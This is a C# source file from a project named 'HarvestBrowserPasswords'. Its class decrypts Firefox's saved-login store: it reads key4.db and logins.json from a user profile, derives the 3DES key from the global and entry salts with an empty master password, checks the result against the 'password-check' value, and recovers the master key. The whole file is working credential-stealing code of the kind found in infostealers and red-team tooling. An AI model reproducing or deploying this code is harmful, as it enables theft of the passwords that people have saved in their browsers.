using System;
using System.IO;
using System.Collections;
using System.Collections.Specialized;
using System.Linq;
using System.Text;
using System.Data.SQLite;
using Newtonsoft.Json;
using System.Security.Cryptography;

namespace HarvestBrowserPasswords
{
    public class FirefoxDatabaseDecryptor
    {
        private string ProfileDir               { get; set; }
        private string Key4dbpath               { get; set; }
        private byte[] GlobalSalt               { get; set; }
        public byte[] EntrySaltPasswordCheck    { get; set; }
        private byte[] EntrySalt3DESKey         { get; set; }
        public byte[] CipherTextPasswordCheck   { get; set; }
        public byte[] CipherText3DESKey         { get; set; }
        public string MasterPassword            { get; set; }
        public byte[] DecryptedPasswordCheck    { get; set; }
        public byte[] Decrypted3DESKey          { get; set; }

        public FirefoxDatabaseDecryptor(string profile)
        {
            ProfileDir = profile;
            Key4dbpath = ProfileDir + @"\key4.db";
            MasterPassword = "";

            //Check profile for key4 database before attempting decryption
            if (File.Exists(Key4dbpath))
            {
                Key4DatabaseConnection(Key4dbpath);

                //Store a RootObject from FirefoxLoginsJSON (hopefully) containing multiple FirefoxLoginsJSON.Login instances
                FirefoxLoginsJSON.Rootobject JSONLogins = GetJSONLogins(ProfileDir);

                //Decrypt password-check value to ensure correct decryption
                DecryptedPasswordCheck = Decrypt3DES(GlobalSalt, EntrySaltPasswordCheck, CipherTextPasswordCheck, MasterPassword);

                if (PasswordCheck(DecryptedPasswordCheck))
                {   
                    //Decrypt master key
                    Decrypted3DESKey = Decrypt3DES(GlobalSalt, EntrySalt3DESKey, CipherText3DESKey, MasterPassword);
                }

            }
        }

        // read logins.json file and deserialize the JSON into FirefoxLoginsJSON class
        public FirefoxLoginsJSON.Rootobject GetJSONLogins(string profileDir)
        {

            //Read logins.json from file and deserialise JSON into FirefoxLoginsJson object
            string file = File.ReadAllText(profileDir + @"\logins.json");
            FirefoxLoginsJSON.Rootobject JSONLogins = JsonConvert.DeserializeObject<FirefoxLoginsJSON.Rootobject>(file);

            return JSONLogins;
        }

        public void Key4DatabaseConnection(string key4dbPath)
        {
            SQLiteConnection connection = new SQLiteConnection(
                $"Data Source={key4dbPath};" +
                $"Version=3;" +
                $"New=True");

            try
            {
                connection.Open();

                //First query the metadata table to verify the master password
                SQLiteCommand commandPasswordCheck = connection.CreateCommand();
                commandPasswordCheck.CommandText = "SELECT item1,item2 FROM metadata WHERE id = 'password'";
                SQLiteDataReader dataReader = commandPasswordCheck.ExecuteReader();

                //Parse the ASN.1 data in the 'password' row to extract entry salt and cipher text for master password verification
                while (dataReader.Read())
                {
                    GlobalSalt = (byte[])dataReader[0];
                    //https://docs.microsoft[.]com/en-us/dotnet/api/system.security.cryptography.asnencodeddata?view=netframework-4.8#constructors
                    byte[] item2Bytes = (byte[])dataReader[1];

                    ASN1Parser parser = new ASN1Parser(item2Bytes);

                    EntrySaltPasswordCheck = parser.EntrySalt;
                    CipherTextPasswordCheck = parser.CipherText;
                }

                //Second, query the nssPrivate table for entry salt and encrypted 3DES key
                SQLiteCommand commandNSSPrivateQuery = connection.CreateCommand();
                commandNSSPrivateQuery.CommandText = "SELECT a11,a102 FROM nssPrivate";
                dataReader = commandNSSPrivateQuery.ExecuteReader();

                //Parse the ASN.1 data in the 'password' row to extract entry salt and cipher text for master password verification
                while (dataReader.Read())
                {
                    byte[] a11 = (byte[])dataReader[0];
                    //https://docs.microsoft[.]com/en-us/dotnet/api/system.security.cryptography.asnencodeddata?view=netframework-4.8#constructors
                    byte[] a102 = (byte[])dataReader[1]; // Probably don't need this???

                    ASN1Parser parser = new ASN1Parser(a11);

                    EntrySalt3DESKey = parser.EntrySalt;
                    CipherText3DESKey = parser.CipherText;
                }

            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Exception: {e}");
            }
            finally
            {
                connection.Dispose();
            }
        }

        public static byte[] Decrypt3DES(byte[] globalSalt, byte[] entrySalt, byte[] cipherText, string masterPassword)
        {
            //https://github[.]com/lclevy/firepwd/blob/master/mozilla_pbe.pdf

            byte[] password = Encoding.ASCII.GetBytes(masterPassword);
            byte[] hashedPassword;
            byte[] keyFirstHalf;
            byte[] keySecondHalf;
            byte[] edeKey;
            byte[] decryptedResult;

            //DEBUG
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("DEBUG - Master Password Decryption");
            Console.WriteLine($"CipherText:             {BitConverter.ToString(cipherText)}");
            Console.WriteLine($"Master Password:        {masterPassword}"); 

            //Hashed Password = SHA1(salt + password)
            byte[] hashedPasswordBuffer = new byte[globalSalt.Length + password.Length];
            //Copy salt into first chunk of new buffer
            Buffer.BlockCopy(globalSalt, 0, hashedPasswordBuffer, 0, globalSalt.Length);
            //Copy password into second chunk of buffer
            Buffer.BlockCopy(password, 0, hashedPasswordBuffer, globalSalt.Length, password.Length);
            hashedPassword = hashedPasswordBuffer;

            //DEBUG
            Console.WriteLine($"Global Salt:            {BitConverter.ToString(globalSalt)}");
  
            using (SHA1 sha1 = new SHA1CryptoServiceProvider())
            {
                hashedPassword = sha1.ComputeHash(hashedPassword);
            }

            //Combined Hashed Password = SHA1(hashedpassword + entrysalt)
            byte[] combinedHashedPassword = new byte[hashedPassword.Length + entrySalt.Length];
            Buffer.BlockCopy(hashedPassword, 0, combinedHashedPassword, 0, hashedPassword.Length);
            Buffer.BlockCopy(entrySalt, 0, combinedHashedPassword, hashedPassword.Length, entrySalt.Length);

            using (SHA1 sha1 = new SHA1CryptoServiceProvider())
            {   
                combinedHashedPassword = sha1.ComputeHash(combinedHashedPassword);
            }

            //DEBUG
            Console.WriteLine($"hashedPassword:         {BitConverter.ToString(hashedPassword)}");
            Console.WriteLine($"combinedHashedPassword: {BitConverter.ToString(combinedHashedPassword)}");

            //Create paddedEntrySalt
            byte[] paddedEntrySalt = new byte[20];
            Buffer.BlockCopy(entrySalt, 0, paddedEntrySalt, 0, entrySalt.Length);

            //Create and join the two halves of the encryption key
            try
            {
                using (HMACSHA1 hmac = new HMACSHA1(combinedHashedPassword))
                {
                    //First half of EDE Key = HMAC-SHA1( key=combinedHashedPassword, msg=paddedEntrySalt+entrySalt)
                    byte[] firstHalf = new byte[paddedEntrySalt.Length + entrySalt.Length];
                    Buffer.BlockCopy(paddedEntrySalt, 0, firstHalf, 0, paddedEntrySalt.Length);
                    Buffer.BlockCopy(entrySalt, 0, firstHalf, paddedEntrySalt.Length, entrySalt.Length);

                    //Create TK thing?? = HMAC-SHA1(combinedHashedPassword, paddedEntrySalt)
                    keyFirstHalf = hmac.ComputeHash(firstHalf);
                    byte[] tk = hmac.ComputeHash(paddedEntrySalt);

                    //Second half of EDE key = HMAC-SHA1(combinedHashedPassword, tk + entrySalt)
                    byte[] secondHalf = new byte[tk.Length + entrySalt.Length];
                    Buffer.BlockCopy(tk, 0, secondHalf, 0, entrySalt.Length);
                    Buffer.BlockCopy(entrySalt, 0, secondHalf, tk.Length, entrySalt.Length);

                    keySecondHalf = hmac.ComputeHash(secondHalf);

                    //Join first and second halves of EDE key
                    byte[] tempKey = new byte[keyFirstHalf.Length + keySecondHalf.Length];
                    Buffer.BlockCopy(keyFirstHalf, 0, tempKey, 0, keyFirstHalf.Length);
                    Buffer.BlockCopy(keySecondHalf, 0, tempKey, keyFirstHalf.Length, keySecondHalf.Length);

                    edeKey = tempKey;
                }

                //DEBUG
                Console.WriteLine($"EDE KEY:                {BitConverter.ToString(edeKey)}");

                byte[] key = new byte[24];
                byte[] iv = new byte[8];

                //Extract 3DES encryption key from first 24 bytes of EDE key
                Buffer.BlockCopy(edeKey, 0, key, 0, 24);
                Console.WriteLine($"DES Encryption key:     {BitConverter.ToString(key)}");
                //Extract initialization vector from last 8 bytes of EDE key
                Buffer.BlockCopy(edeKey, (edeKey.Length - 8), iv, 0, 8);
                Console.WriteLine($"IV:                     {BitConverter.ToString(iv)}");

                using (TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider
                {
                    Key = key,
                    IV = iv,
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.None
                })
                {
                    ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor();
                    decryptedResult = cryptoTransform.TransformFinalBlock(cipherText, 0, cipherText.Length);
                }

                //passwordCheck = Encoding.ASCII.GetString(result); 
            }
            catch (Exception e)
            {
                Console.WriteLine($"Exception {e}");
                decryptedResult = null;
            }
            Console.ResetColor();
            return decryptedResult;
        }

        public static bool PasswordCheck(byte[] passwordCheck)
        {
            //checkValue = "password-check\x02\x02"
            byte[] checkValue = new byte[] { 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x2d, 0x63, 0x68, 0x65, 0x63, 0x6b, 0x02, 0x02 };

            if (passwordCheck.SequenceEqual(checkValue))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Password Check success!");
                Console.ResetColor();

                return true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Password Check Fail...");
                Console.ResetColor();

                return false;
            }
        }
            
    }
}
